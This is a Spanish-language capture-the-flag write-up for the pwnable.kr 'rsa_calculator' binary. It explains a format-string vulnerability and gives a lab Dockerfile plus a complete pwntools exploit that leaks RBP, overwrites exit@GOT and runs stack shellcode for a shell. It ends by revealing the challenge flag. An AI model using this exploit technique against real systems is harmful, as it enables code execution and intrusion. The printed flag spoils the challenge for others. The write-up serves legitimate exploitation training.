# rsa calculator

<img width="137" height="176" alt="rsa calculator" src="https://github.com/user-attachments/assets/c3ba1dbd-3402-4352-962d-2716f81157e8" />

```
 checksec rsa_calculator
[*] '/home/kalcast/Laboratorio/crypto/rsa_calculator'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

## Introduccion

Podemos observar que el stack es ejecutable. Escribiremos shellcode en una direccion de la pila y redirigiremos el flujo de ejecucion alli para invocar una shell.

Las funciones que nos interesan son `RSA_encrypt` y `RSA_decrypt`, pero primero tenemos que llamar a `set_key_pair` para crear un par de claves RSA.

Esta funcion tiene una comprobacion inusual que hace el cifrado practicamente inutil (no voy a empezar a escribir aritmetica modular aqui). Despues hay otra comprobacion sobre el tamaño de n:

<img width="403" height="158" alt="2025-08-05-212610_403x158_scrot" src="https://github.com/user-attachments/assets/11a49e3a-5a74-40f3-8a95-612d47fc0cde" />

Una combinacion que funciona puede ser `p=10000, q=10000, e=1, d=1`.

Si encriptas un mensaje observas que el programa en la practica lo que hace es codificar en hexadecimal y extender el `byte` a un `int`.

La implementacion de este programa tiene varios bugs pero lo mas util es la vulnerabilidad de cadena formateada en `printf(g_ebuf)` y `printf(g_pbuf)` en `RSA_encrypt` y `RSA_decrypt` respectivamente.

## Explotacion
Objetivo: Sobreescribir la entrada de `exit` en la GOT por una direccion en el stack donde almacenamos shellcode.

#### Paso 1: Filtrar RBP
Para esto hay que construir el Dockefile. Cambié el script de perl por `socat` para servir el binario:
``` Dockerfile

FROM ubuntu:16.04

RUN dpkg --add-architecture i386 && \
    apt update && \
    apt install -y gcc-multilib libc6:i386 libssl1.0.0:i386 lib32stdc++6 lib32z1 gdb file net-tools socat

RUN useradd -u 1128 -m rsa_calculator_pwn

COPY rsa_calculator /home/rsa_calculator_pwn/rsa_calculator
COPY flag /home/rsa_calculator_pwn/flag

RUN chown root:rsa_calculator_pwn /home/rsa_calculator_pwn/rsa_calculator /home/rsa_calculator_pwn/flag
RUN chmod 550 /home/rsa_calculator_pwn/rsa_calculator
RUN chmod 440 /home/rsa_calculator_pwn/flag

USER rsa_calculator_pwn
WORKDIR /home

CMD ["socat", "TCP-LISTEN:1337,reuseaddr,fork", "EXEC:/home/rsa_calculator_pwn/rsa_calculator,pty,stderr"]
```

Usando gdb encontre un puntero a `RBP+0x100` en esta direccion:

<img width="807" height="466" alt="2025-08-05-214228_807x466_scrot" src="https://github.com/user-attachments/assets/745b9ec1-0db8-4e20-8aea-72d40f2cf686" />

#### Paso 2: Hallar el offset con respecto a RBP de la direccion del shellcode
Cuando llamamos a `RSA_encrypt` se almacena en el stack la entrada de usuario.

Luego si se llama a `RSA_decrypt`, si nuestro mensaje codificado no es muy largo, **la entrada anterior (el texto plano)** se mantiene en el stack**.

El inicio es en `RBP-0x410`:

<img width="957" height="645" alt="2025-08-05-211630_957x645_scrot" src="https://github.com/user-attachments/assets/ae47e856-ba9f-43d5-9978-2e115511c7e1" />

El exploit: 

```py
from pwn import *

elf = context.binary = ELF("./rsa_calculator")
r = remote("pwnable.kr",9012)

def generate_key_pair():
    # Hardocoded
    return {'p': 10000, 'q': 10000, 'e': 1, 'd': 1}

def set_key_pair():
    keys = generate_key_pair()
    r.sendline(b"1")
    r.sendline(str(keys["p"]).encode())
    r.sendline(str(keys["q"]).encode())
    r.sendline(str(keys["e"]).encode())
    r.sendline(str(keys["d"]).encode())

def encrypt(msg):
    r.sendline(b"2")
    r.sendline(str(len(msg)).encode())
    r.sendline(msg)
    r.recvuntil(b" (hex encoded) -\n")
    return r.recvline().strip()

def decrypt(l, hexdata):
    r.sendline(b"3")
    r.sendline(str(l*8).encode())
    r.sendline(hexdata)
    r.recvuntil(b"result -\n")
    return r.recvline().strip()

def write_short(offset,write):
    payload = fmtstr_payload(offset,write,write_size="short",write_size_max="short")
    hexdata = encrypt(payload)
    decrypt(len(payload),hexdata)

set_key_pair()

# Leak rbp
fstring = b"%219$p"
hexdata = encrypt(fstring)
output = decrypt(len(fstring),hexdata)
rbp = int(output[:14],16) - 0x100
sh_addr = rbp - 0x410
log.success("RBP leaked: " + hex(rbp))

# Overwrite exit@GOT
write_short(76,{0x602068: (sh_addr) & 0xFFFF})
write_short(76,{0x602068 + 2: (sh_addr >> 16) & 0xFFFF})
write_short(76,{0x602068 + 4: (sh_addr >> 32) & 0xFFFF})

# Write shellcode
shellcode = asm(shellcraft.sh())
hexdata = encrypt(shellcode)
decrypt(len(shellcode),hexdata)

# Shell
r.sendline(b"5")
r.interactive()
```

`w4at_a_buggy_RS4_c4lculat0r`

